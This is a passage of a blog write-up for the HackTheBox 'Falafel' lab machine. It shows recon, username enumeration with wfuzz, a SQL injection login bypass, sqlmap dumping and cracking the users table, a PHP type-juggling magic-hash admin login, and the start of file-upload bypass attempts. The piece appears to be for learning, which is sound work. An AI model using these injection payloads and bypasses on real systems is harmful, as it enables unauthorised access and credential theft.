@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Falafel | I liked this box. Although I suspected for SQL injections sqlmap did not produce any results and this is where I got stuck mostly. Anyway when...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Falafel</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-05-25 08:38:00+01:00">Mon 25 May 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Falafel.html">Falafel</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Falafel.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>I liked this box. Although I suspected for SQL injections <code>sqlmap</code> did not produce any results and this is where I got stuck mostly. Anyway when you get stuck is where you learn most in my opinion as you start doing a lot of research, and once you get it is difficult to forget! I also loved the PHP Juggling vulnerability which is not straightforward to catch if you never knew about it. </p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -p- -sC -sV <span class="m">10</span>.10.10.73                                                                                
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 11:10 BST</span>
+<span class="go">Nmap scan report for 10.10.10.73</span>
+<span class="go">Host is up (0.097s latency).</span>
+<span class="go">Not shown: 65527 closed ports</span>
+<span class="go">PORT      STATE    SERVICE      VERSION</span>
+<span class="go">22/tcp    open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)</span>
+<span class="go">|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)</span>
+<span class="go">|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)</span>
+<span class="go">80/tcp    open     http         Apache httpd 2.4.18 ((Ubuntu))</span>
+<span class="go">| http-robots.txt: 1 disallowed entry </span>
+<span class="go">|_/*.txt</span>
+<span class="go">|_http-server-header: Apache/2.4.18 (Ubuntu)</span>
+<span class="go">|_http-title: Falafel Lovers</span>
+<span class="go">6242/tcp  filtered jeol-nsdtp-2</span>
+<span class="go">34240/tcp filtered unknown</span>
+<span class="go">36441/tcp filtered unknown</span>
+<span class="go">38674/tcp filtered unknown</span>
+<span class="go">48342/tcp filtered unknown</span>
+<span class="go">50840/tcp filtered unknown</span>
+<span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 1325.28 seconds</span>
+</pre></div>
+
+
+<p><code>nmap</code> shows there is a webserver which host the following website:</p>
+<p><img alt="" src="../images/falafel-lovers.png"></p>
+<p>there is also a login page:</p>
+<p><img alt="" src="../images/falafel-login.png"></p>
+<p>The page source does not show anything unusual, but it's clear with a dealing with a PHP website. <code>nmap</code> indicates there is a <code>robots.txt</code> but it only shows the following:</p>
+<div class="highlight"><pre><span></span><span class="go">User-agent: *</span>
+<span class="go">Disallow: /*.txt</span>
+</pre></div>
+
+
+<p>It's time to scan for directories and files with <code>gobuster</code>: </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t <span class="m">20</span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.73</span>
+<span class="go">[+] Threads:        20</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Extensions:     txt,php,html</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/05/27 04:27:28 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/images (Status: 301)</span>
+<span class="go">/index.php (Status: 200)</span>
+<span class="go">/login.php (Status: 200)</span>
+<span class="go">/profile.php (Status: 302)</span>
+<span class="go">/uploads (Status: 301)</span>
+<span class="go">/header.php (Status: 200)</span>
+<span class="go">/assets (Status: 301)</span>
+<span class="go">/footer.php (Status: 200)</span>
+<span class="go">/upload.php (Status: 302)</span>
+<span class="go">/css (Status: 301)</span>
+<span class="go">/style.php (Status: 200)</span>
+<span class="go">/js (Status: 301)</span>
+<span class="go">/logout.php (Status: 302)</span>
+<span class="go">/robots.txt (Status: 200)</span>
+<span class="go">/cyberlaw.txt (Status: 200)</span>
+<span class="go">/connection.php (Status: 200)</span>
+<span class="go">/server-status (Status: 403)</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/05/27 05:42:56 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>the <code>/cyberlaw.txt</code> file shows the following:</p>
+<p><img alt="" src="../images/falafel-cyberlaw.png"></p>
+<p>This is a very interesting piece of information. The fact that the user <code>chris</code> managed to get access without password may suggest that there is some kind of vulnerability. </p>
+<p>I started playing a bit with the login page. I tried to login with a random user and password and I got the message "Try again.." but if I try to login with <code>admin</code> and a random password I got the message "Wrong identification : admin". This suggests <code>admin</code> could be a valid user. The same behavior happens if I try with the user <code>chris</code>, I got the message <strong>"Wrong identification : chris"</strong>. </p>
+<p>I used burp to capture a login request and this is what I get:</p>
+<div class="highlight"><pre><span></span>POST /login.php HTTP/1.1
+
+Host: 10.10.10.73
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://10.10.10.73/login.php
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 32
+
+Connection: close
+
+Cookie: PHPSESSID=bn0re9ksjlkav2k7rn1a206kk7
+
+Upgrade-Insecure-Requests: 1
+
+
+
+username=admin&amp;password=test123!!
+</pre></div>
+
+
+<p>I am pretty confident <code>admin</code> and <code>chris</code> are valid users but we can use WFUZZ to confirm that and to find other potential users. We can use the POST request we found earlier, we just need to replace the user field with the word FUZZ so that the tool can do its job:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> wfuzz -c -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -d <span class="s2">&quot;username=FUZZ&amp;password=test123wfuzz --help&quot;</span> -u http://10.10.10.73/login.php    
+
+<span class="go">********************************************************                                                                                                                                                         </span>
+<span class="go">* Wfuzz 2.4.5 - The Web Fuzzer                         *                                                                                                                                                         </span>
+<span class="go">********************************************************                                                                                                                                                         </span>
+
+<span class="go">Target: http://10.10.10.73/login.php                                                                                                                                                                             </span>
+<span class="go">Total requests: 10164                                                                                                                                                                                            </span>
+
+<span class="go">===================================================================                                                                                                                                              </span>
+<span class="go">ID           Response   Lines    Word     Chars       Payload                                                                                                                                                    </span>
+<span class="go">===================================================================                                                                                                                                              </span>
+
+<span class="go">000000009:   200        102 L    657 W    7074 Ch     &quot;abahri&quot;                                                                                                                                                   </span>
+<span class="go">000000002:   200        102 L    657 W    7074 Ch     &quot;aaren&quot;                                                                                                                                                    </span>
+<span class="go">000000004:   200        102 L    657 W    7074 Ch     &quot;aaron&quot;                                                                                                                                                    </span>
+<span class="go">000000005:   200        102 L    657 W    7074 Ch     &quot;aartjan&quot;                                                                                                                                                  </span>
+<span class="go">000000006:   200        102 L    657 W    7074 Ch     &quot;aarushi&quot;                                                                                                                                                  </span>
+<span class="go">000000007:   200        102 L    657 W    7074 Ch     &quot;abagael&quot;                                                                                                                                                  </span>
+<span class="go">000000008:   200        102 L    657 W    7074 Ch     &quot;abagail&quot;                                                                                                                                                  </span>
+<span class="go">000000010:   200        102 L    657 W    7074 Ch     &quot;abbas&quot;    </span>
+
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>Once WFUZZ starts it makes several requests to the login page using the users in the wordlist provided (I used <a href="https://github.com/danielmiessler/SecLists">this one</a>). From the above output we can see the number of chars of the response is 7074. We can filter this out by adding <code>--hh 7074</code> in the command so that we will get only ouput that differs from that:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> wfuzz -c -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -d <span class="s2">&quot;username=FUZZ&amp;password=test123wfuzz --help&quot;</span> -u http://10.10.10.73/login.php --hh <span class="m">7074</span>
+
+
+<span class="go">********************************************************</span>
+<span class="go">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span>
+<span class="go">********************************************************</span>
+
+<span class="go">Target: http://10.10.10.73/login.php</span>
+<span class="go">Total requests: 10164</span>
+
+<span class="go">===================================================================</span>
+<span class="go">ID           Response   Lines    Word     Chars       Payload                                                                                                                                         </span>
+<span class="go">===================================================================</span>
+
+<span class="go">000000086:   200        102 L    659 W    7091 Ch     &quot;admin&quot;                                                                                                                                         </span>
+<span class="go">000001883:   200        102 L    659 W    7091 Ch     &quot;chris&quot;                                                                                                                                         </span>
+
+<span class="go">Total time: 127.0397</span>
+<span class="go">Processed Requests: 10164</span>
+<span class="go">Filtered Requests: 10162</span>
+<span class="go">Requests/sec.: 80.00645</span>
+</pre></div>
+
+
+<p>After some time we got the result that confirmed that <code>admin</code> and <code>chris</code> are valid users. </p>
+<p>Since we know the user <code>chris</code> managed to get access without password, maybe there is an sql injection login bypass vulnerability so let's check that. A good resource can be found <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">here</a></p>
+<p>After few tries I got something with <code>test' or '1'='1</code>. In fact, when I add this in the username field and I use a random password I get the message <strong>"Wrong identification: admin"</strong>. </p>
+<p><img alt="" src="../images/falafel-sqli.png"></p>
+<p>So even if we haven't used <code>admin</code> in the query we still get this result. Question is Why?</p>
+<p>I think when the user tries to login with username and password the request gets to the server and the latter first verifies the user exists with an SQL query. If the user exists then it checks if the password is correct with another SQL query. When we use the string <code>' or '1'='1</code> in the username field, a query similar to this will be initiated:</p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span> <span class="k">like</span> <span class="s1">&#39;test&#39;</span> <span class="k">or</span> <span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>
+</pre></div>
+
+
+<p>The first part is FALSE because the user <code>test</code> does not exist but the second part (1=1) is always TRUE!</p>
+<p>So because the condition is TRUE the server thinks the user exists and throws the error message "Wrong identification: admin". But why <code>admin</code> and not <code>chris</code>? I think most likely because <code>admin</code> is the first user in the table, I don't see other reasons.</p>
+<p>Now we know for sure we have an SQLi so we can use <code>sqlmap</code> to exploit it. Because first the web server checks if the user exists, if we simply run <code>sqlmap</code> with standard parameters it won't find anything. In fact, when I tried it I got the message:</p>
+<div class="highlight"><pre><span></span>[09:20:41] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &#39;--level&#39;/&#39;--risk&#39; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#39;--tamper&#39; (e.g. &#39;--tamper=space2comment&#39;) and/or switch &#39;--random-agent&#39;
+</pre></div>
+
+
+<p>To bypass the user check we can use the <code>--string</code> option passing the string to match when the query is evaluated to true. This is from the <code>sqlmap</code> man page:</p>
+<div class="highlight"><pre><span></span><span class="go">--string=STRING</span>
+<span class="go">              String to match when query is evaluated to True</span>
+</pre></div>
+
+
+<p>Note that I included the login POST request into a file, that is <code>post.req</code>: </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sqlmap -r Documents/htbBoxes/falafel/post.req --level <span class="m">5</span> --risk <span class="m">3</span> --batch -p username --string <span class="s2">&quot;Wrong identification&quot;</span>
+<span class="go">        ___</span>
+<span class="go">       __H__</span>
+<span class="go"> ___ ___[(]_____ ___ ___  {1.4.5#stable}</span>
+<span class="go">|_ -| . [)]     | .&#39;| . |</span>
+<span class="go">|___|_  [&quot;]_|_|_|__,|  _|</span>
+<span class="go">      |_|V...       |_|   http://sqlmap.org</span>
+
+<span class="go">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+
+<span class="go">[*] starting @ 06:46:20 /2020-05-28/</span>
+
+<span class="go">[06:46:20] [INFO] parsing HTTP request from &#39;Documents/htbBoxes/falafel/post.req&#39;</span>
+<span class="go">[06:46:20] [INFO] resuming back-end DBMS &#39;mysql&#39; </span>
+<span class="go">[06:46:20] [INFO] testing connection to the target URL</span>
+<span class="go">[06:46:20] [INFO] testing if the provided string is within the target URL page content</span>
+<span class="go">sqlmap resumed the following injection point(s) from stored session:</span>
+<span class="go">---</span>
+<span class="go">Parameter: username (POST)</span>
+<span class="go">    Type: boolean-based blind</span>
+<span class="go">    Title: AND boolean-based blind - WHERE or HAVING clause</span>
+<span class="go">    Payload: username=admin&#39; AND 4880=4880-- feEp&amp;password=password</span>
+<span class="go">---</span>
+<span class="go">[06:46:20] [INFO] the back-end DBMS is MySQL</span>
+<span class="go">back-end DBMS: MySQL 5</span>
+<span class="go">[06:46:20] [INFO] fetched data logged to text files under &#39;/home/m4rc0ff/.sqlmap/output/10.10.10.73&#39;</span>
+
+<span class="go">[*] ending @ 06:46:20 /2020-05-28/</span>
+</pre></div>
+
+
+<p>So we got a hit with <code>sqlmap</code>, let's now dump the details by adding the <code>--dump</code> option:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sqlmap -r Documents/htbBoxes/falafel/post.req --level <span class="m">5</span> --risk <span class="m">3</span> --batch -p username --string <span class="s2">&quot;Wrong identification&quot;</span> --dump
+<span class="go">        ___                           </span>
+<span class="go">       __H__</span>
+<span class="go"> ___ ___[,]_____ ___ ___  {1.4.5#stable}  </span>
+<span class="go">|_ -| . [)]     | .&#39;| . |                                                                               </span>
+<span class="go">|___|_  [.]_|_|_|__,|  _|                                                                               </span>
+<span class="go">      |_|V...       |_|   http://sqlmap.org</span>
+
+<span class="go">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume </span>
+<span class="go">no liability and are not responsible for any misuse or damage caused by this program</span>
+
+<span class="go">[*] starting @ 07:07:34 /2020-05-28/                                                                    </span>
+
+<span class="go">[07:07:34] [INFO] parsing HTTP request from &#39;Documents/htbBoxes/falafel/post.req&#39;</span>
+<span class="go">[07:07:34] [INFO] resuming back-end DBMS &#39;mysql&#39;                                                        </span>
+<span class="go">[07:07:34] [INFO] testing connection to the target URL                    </span>
+<span class="go">[07:07:34] [INFO] testing if the provided string is within the target URL page content</span>
+<span class="go">sqlmap resumed the following injection point(s) from stored session:</span>
+<span class="go">---                                                                                                                                                                                                              </span>
+<span class="go">Parameter: username (POST)                                                                              </span>
+<span class="go">    Type: boolean-based blind</span>
+<span class="go">    Title: AND boolean-based blind - WHERE or HAVING clause</span>
+<span class="go">    Payload: username=admin&#39; AND 4880=4880-- feEp&amp;password=password</span>
+<span class="go">---                     </span>
+<span class="go">[07:07:34] [INFO] the back-end DBMS is MySQL</span>
+<span class="go">back-end DBMS: MySQL 5</span>
+<span class="go">[07:07:34] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries</span>
+<span class="go">[07:07:34] [INFO] fetching current database</span>
+<span class="go">[07:07:34] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval</span>
+<span class="go">[07:07:34] [INFO] retrieved: falafel</span>
+<span class="go">[07:07:39] [INFO] fetching tables for database: &#39;falafel&#39;</span>
+<span class="go">[07:07:39] [INFO] fetching number of tables for database &#39;falafel&#39;</span>
+<span class="go">[07:07:39] [INFO] retrieved: 1</span>
+<span class="go">[07:07:40] [INFO] retrieved: users</span>
+<span class="go">[07:07:43] [INFO] fetching columns for table &#39;users&#39; in database &#39;falafel&#39;</span>
+<span class="go">[07:07:43] [INFO] retrieved: 4</span>
+<span class="go">[07:07:44] [INFO] retrieved: ID</span>
+<span class="go">[07:07:45] [INFO] retrieved: username</span>
+<span class="go">[07:07:51] [INFO] retrieved: password</span>
+<span class="go">[07:07:56] [INFO] retrieved: role</span>
+<span class="go">[07:07:59] [INFO] fetching entries for table &#39;users&#39; in database &#39;falafel&#39;</span>
+<span class="go">[07:07:59] [INFO] fetching number of entries for table &#39;users&#39; in database &#39;falafel&#39;</span>
+<span class="go">[07:07:59] [INFO] retrieved: 2</span>
+<span class="go">[07:07:59] [INFO] retrieved: 1</span>
+<span class="go">[07:08:00] [INFO] retrieved: 0e462096931906507119562988736854</span>
+<span class="go">[07:08:24] [INFO] retrieved: admin</span>
+<span class="go">[07:08:27] [INFO] retrieved: admin</span>
+<span class="go">[07:08:31] [INFO] retrieved: 2</span>
+<span class="go">[07:08:32] [INFO] retrieved: d4ee02a22fc872e36d9e3751ba72ddc8</span>
+<span class="go">[07:09:02] [INFO] retrieved: normal</span>
+<span class="go">[07:09:06] [INFO] retrieved: chris</span>
+<span class="go">[07:09:09] [INFO] recognized possible password hashes in column &#39;`password`&#39;</span>
+<span class="go">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N </span>
+<span class="go">do you want to crack them via a dictionary-based attack? [Y/n/q] Y</span>
+<span class="go">[07:09:09] [INFO] using hash method &#39;md5_generic_passwd&#39;</span>
+<span class="go">what dictionary do you want to use?</span>
+<span class="go">[1] default dictionary file &#39;/usr/share/sqlmap/data/txt/wordlist.tx_&#39; (press Enter)</span>
+<span class="go">[2] custom dictionary file</span>
+<span class="go">[3] file with list of dictionary files</span>
+<span class="gp">&gt;</span> <span class="m">1</span>
+<span class="go">[07:09:09] [INFO] using default dictionary</span>
+<span class="go">do you want to use common password suffixes? (slow!) [y/N] N</span>
+<span class="go">[07:09:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span>
+<span class="go">[07:09:09] [INFO] starting 2 processes </span>
+<span class="go">[07:09:18] [INFO] cracked password &#39;juggling&#39; for user &#39;chris&#39;                                                                                                                                                   </span>
+<span class="go">Database: falafel                                                                                                                                                                                                </span>
+<span class="go">Table: users</span>
+<span class="go">[2 entries]</span>
+<span class="go">+------+--------+----------+---------------------------------------------+</span>
+<span class="go">| ID   | role   | username | password                                    |</span>
+<span class="go">+------+--------+----------+---------------------------------------------+</span>
+<span class="go">| 1    | admin  | admin    | 0e462096931906507119562988736854            |</span>
+<span class="go">| 2    | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) |</span>
+<span class="go">+------+--------+----------+---------------------------------------------+</span>
+
+<span class="go">[07:09:24] [INFO] table &#39;falafel.users&#39; dumped to CSV file &#39;/home/m4rc0ff/.sqlmap/output/10.10.10.73/dump/falafel/users.csv&#39;</span>
+<span class="go">[07:09:24] [INFO] fetched data logged to text files under &#39;/home/m4rc0ff/.sqlmap/output/10.10.10.73&#39;</span>
+
+<span class="go">[*] ending @ 07:09:24 /2020-05-28/</span>
+</pre></div>
+
+
+<p>and from the output above we can see <code>sqlmap</code> found the user <code>admin</code> with its hash but the hash was not cracked, whereas it found the user <code>chris</code> with the cracked hash. That being said, I am now able to login to the website with <code>chris</code> credentials:</p>
+<p><img alt="" src="../images/falafel-chris.png"></p>
+<p>I had a look around but both the webpage and its source do not contain anything interesting, seems like a rabbit hole. </p>
+<p>I tried cracking the <code>admin</code> hash with <code>hashcat</code> and also using some online hash cracking websites but I was not successful. Eventually, the hint was the word "juggling", but I would not have found out without having a peek at <a href="https://www.youtube.com/watch?v=CUbWpteTfio&amp;list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf&amp;index=26">Ippsec Falafel video</a>, this is what I do when I am stuck.</p>
+<p>So a little explanation about the PHP type Juggling is needed. PHP provides two ways to compare two variables:</p>
+<ul>
+<li><strong>Loose Comparison</strong> using <code>==</code> or <code>!=</code></li>
+<li><strong>Strict Comparison</strong> using <code>===</code> or <code>!==</code></li>
+</ul>
+<p>Good reference examples can be found <a href="https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/">here</a> and <a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">here</a>.</p>
+<p>To give a more practical example, <strong>Loose Comparison</strong> works like this:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> php -a
+<span class="go">Interactive mode enabled</span>
+
+<span class="go">php &gt; echo &#39;twentieth&#39; + 4;</span>
+<span class="go">PHP Warning:  A non-numeric value encountered in php shell code on line 1</span>
+<span class="go">4</span>
+<span class="go">php &gt; echo &#39;20th&#39; + 4;</span>
+<span class="go">PHP Notice:  A non well formed numeric value encountered in php shell code on line 1</span>
+<span class="go">24</span>
+</pre></div>
+
+
+<p>The above happens because in loose comparisons when a string starts with a number, PHP pulls that number out and use it at the value for the mathematical operation. Now this can be useful in specific use cases but can be dangerous in other.</p>
+<p>In our specific case, the <code>admin</code> password hash starts with <code>0e</code>:</p>
+<p><code>0e462096931906507119562988736854</code></p>
+<p>In loose comparisons when something starts with <code>0e</code> and is followed by numbers, PHP interpretes it as <code>0</code> to the power of the number that follow. In the case of <code>0e462096931906507119562988736854</code> PGP interpretes it at <code>0</code> to the power (<code>e</code>) of <code>462096931906507119562988736854</code>, that is always going to equal to <code>0</code>.</p>
+<p>Because of this we can have "hash collisions", that is any password for which its hash starts with <code>0e</code> would be valid for us to login. So I picked up a random MD5 hash that starts with <code>0e</code> from this <a href="https://github.com/spaze/hashes/blob/master/md5.md">website</a>:</p>
+<h4 id="password-kxsu0az2ptre">password: KXsU0AZ2PtRe</h4>
+<h4 id="hash-0e448778299130864449509797129898">hash: 0e448778299130864449509797129898</h4>
+<p>and with that password I was able to login in the website as admin. To be fair I tried few more of that list and I was always able to login. To avoid this issue <strong>Strict Comparison</strong> must be used.</p>
+<p>Once logged in as <code>admin</code> I can see this:</p>
+<p><img alt="" src="../images/falafel-admin.png"></p>
+<p>I then start a python SimpleHttp server in my kali box on a directory where I have a png file named <code>falafel.png</code>, and I insert the URL of the png (<code>http://10.10.14.15/falafel.png</code>) in the upload box. Once I click on upload I get this output:</p>
+<p><img alt="" src="../images/falafel-upload.png"></p>
+<p>The highlighted string shows that the web server is using <code>wget</code> to download the image I provided.</p>
+<p>At this stage I tried many few PHP file upload bypass techniques to upload a small shell:</p>
+<ol>
+<li>renamed the shell as shell.php.png</li>
+<li>embedded the shell within the image comments with <code>exiftool</code></li>
+<li>change content-type to gif and start content with GIF89a</li>
+</ol>
+<p>however none of these worked. Then I went to the profile page and noticed this:</p>
+<p><img alt="" src="../images/falafel-limits.png"></p>
+<p>As the per Juggling, this was another hint. In fact, this refers to the fact that <code>wget</code> cannot accept a file with more than 255 characters. To prove this, I  create a random 255 characters long pattern:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> msf-pattern_create -l <span class="m">255</span>
+<span class="go">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4</span>
+</pre></div>
+
+
+<p>Then I try to create a file with that pattern with the <code>png</code> extension:</p>
